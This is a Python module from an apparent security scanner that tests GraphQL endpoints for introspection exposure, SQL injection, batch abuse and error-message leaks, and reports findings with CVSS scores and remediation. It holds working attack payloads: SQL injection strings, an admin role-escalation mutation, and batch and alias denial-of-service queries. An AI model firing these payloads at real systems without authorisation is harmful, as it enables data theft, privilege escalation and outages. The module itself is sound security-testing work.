"""GraphQL injection detection and query analysis."""

from __future__ import annotations

import json
import re

from basilisk.models import Finding
from basilisk.scoring import score_finding


INTROSPECTION_QUERIES = [
    '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}',
    '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}}}"}',
    '{"query":"{__type(name:\\"User\\"){name,fields{name,type{name}}}}"}',
    '{"query":"{__type(name:\\"Query\\"){name,fields{name,args{name,type{name}}}}}"}',
]

INJECTION_PAYLOADS = [
    '{"query":"{user(id:\\"1 OR 1=1\\"){id,name,email}}"}',
    '{"query":"{user(id:\\"1\\' UNION SELECT * FROM users--\\"){id}}"}',
    '{"query":"mutation{updateUser(id:\\"1\\",role:\\"admin\\"){id,role}}"}',
    '{"query":"{users(filter:{name_contains:\\"\\' OR \\'1\\'=\\'1\\"}){id,name}}"}',
]

BATCH_ABUSE_PAYLOADS = [
    '[' + ','.join(['{"query":"{__typename}"}'] * 100) + ']',
]

DOS_PAYLOADS = [
    '{"query":"{' + 'a:__typename,' * 50 + '__typename}"}',
]

GRAPHQL_ENDPOINTS = [
    "/graphql",
    "/graphql/v1",
    "/api/graphql",
    "/gql",
    "/query",
    "/v1/graphql",
    "/v2/graphql",
]


def detect_graphql_endpoint(response: dict) -> bool:
    """Check if a response looks like a GraphQL endpoint."""
    body = response.get("body", "")
    content_type = response.get("headers", {}).get("Content-Type", "")

    if "application/json" not in content_type.lower():
        return False

    try:
        data = json.loads(body)
        if isinstance(data, dict):
            return "data" in data or "errors" in data
    except (json.JSONDecodeError, TypeError):
        pass

    return False


def detect_introspection(response: dict, payload: str) -> Finding | None:
    """Check if GraphQL introspection is enabled (information disclosure)."""
    body = response.get("body", "")
    target = response.get("url", "")
    status = response.get("status_code", 0)

    if status != 200:
        return None

    try:
        data = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return None

    if not isinstance(data, dict):
        return None

    # Check for introspection data
    if "data" in data:
        inner = data["data"]
        if isinstance(inner, dict) and ("__schema" in inner or "__type" in inner):
            schema_info = json.dumps(inner)[:200]
            cvss, vector = score_finding("graphql")
            return Finding(
                vulnerability="GraphQL Introspection Enabled",
                severity="Medium",
                description=f"Full schema introspection available. Types discovered: {schema_info}",
                target=target,
                attack_type="graphql",
                payload=payload[:100],
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Disable introspection in production. Use schema access controls.",
                references=["https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"],
            )

    return None


def detect_injection(response: dict, payload: str) -> Finding | None:
    """Detect SQL injection through GraphQL query parameters."""
    body = response.get("body", "")
    target = response.get("url", "")
    status = response.get("status_code", 0)
    lower_body = body.lower()

    sql_errors = ["sql syntax", "mysql_fetch", "sqlite3", "postgresql", "ora-00933"]
    for err in sql_errors:
        if err in lower_body:
            cvss, vector = score_finding("graphql")
            return Finding(
                vulnerability="GraphQL SQL Injection",
                severity="Critical",
                description=f"SQL error '{err}' triggered via GraphQL query: {payload[:80]}",
                target=target,
                attack_type="graphql",
                payload=payload[:100],
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Use parameterized queries in GraphQL resolvers.",
            )

    # Check for data leakage in error messages
    if "errors" in body:
        try:
            data = json.loads(body)
            errors = data.get("errors", [])
            for error in errors:
                msg = str(error.get("message", "")).lower()
                if any(kw in msg for kw in ["syntax", "column", "table", "field"]):
                    cvss, vector = score_finding("graphql")
                    return Finding(
                        vulnerability="GraphQL Error Information Disclosure",
                        severity="Low",
                        description=f"Detailed error message exposed: {msg[:100]}",
                        target=target,
                        attack_type="graphql",
                        payload=payload[:100],
                        cvss_score=cvss,
                        cvss_vector=vector,
                        confidence=0.5,
                    )
        except (json.JSONDecodeError, TypeError):
            pass

    return None


def detect_batch_abuse(response: dict, payload: str) -> Finding | None:
    """Detect if batch queries are accepted (DoS risk)."""
    body = response.get("body", "")
    target = response.get("url", "")
    status = response.get("status_code", 0)

    if status != 200:
        return None

    try:
        data = json.loads(body)
        if isinstance(data, list) and len(data) > 10:
            cvss, vector = score_finding("graphql")
            return Finding(
                vulnerability="GraphQL Batch Query Abuse",
                severity="Medium",
                description=f"Batch queries accepted ({len(data)} responses). Potential DoS vector.",
                target=target,
                attack_type="graphql",
                payload=payload[:80],
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Limit batch query size and implement query complexity analysis.",
            )
    except (json.JSONDecodeError, TypeError):
        pass

    return None


def detect_field_suggestions(response: dict) -> list[str]:
    """Extract field suggestions from GraphQL error responses."""
    body = response.get("body", "")
    suggestions: list[str] = []

    try:
        data = json.loads(body)
        errors = data.get("errors", [])
        for error in errors:
            msg = str(error.get("message", ""))
            # Common pattern: "Did you mean 'fieldName'?"
            matches = re.findall(r"Did you mean ['\"](\w+)['\"]", msg, re.I)
            suggestions.extend(matches)
            # Also: "Cannot query field 'x'. Did you mean 'y' or 'z'?"
            matches2 = re.findall(r"['\"](\w+)['\"]", msg)
            suggestions.extend(matches2)
    except (json.JSONDecodeError, TypeError):
        pass

    return list(set(suggestions))


def get_payloads() -> list[str]:
    return INTROSPECTION_QUERIES + INJECTION_PAYLOADS + BATCH_ABUSE_PAYLOADS

def get_endpoints() -> list[str]:
    return list(GRAPHQL_ENDPOINTS)
